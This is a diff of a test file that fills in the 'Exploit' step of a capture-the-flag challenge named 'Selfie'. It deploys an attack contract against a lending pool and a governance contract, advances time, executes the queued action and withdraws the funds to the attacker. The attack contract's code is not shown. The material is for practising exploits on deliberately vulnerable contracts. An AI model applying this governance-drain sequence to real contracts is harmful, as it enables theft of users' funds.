@@ -6,6 +6,7 @@ const SelfiePool = contract.fromArtifact('SelfiePool');
 const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
 
 const { expect } = require('chai');
+const { utils } = require('mocha');
 
 describe('[Challenge] Selfie', function () {
 
@@ -33,7 +34,14 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        const HackContract = contract.fromArtifact("AttackSelfiePool");
+        const hack = await HackContract.new(this.pool.address, this.governance.address, { from: attacker });
+        const hackReceipt = await hack.hack(1, { from: attacker });
+        // const util = require('util');
+        // console.log(util.inspect(hackReceipt, true, 20));
+        await time.increase(time.duration.days(5));
+        await hack.executeLastAction({from: attacker});
+        await hack.withdraw({from: attacker});
     });
 
     after(async function () {
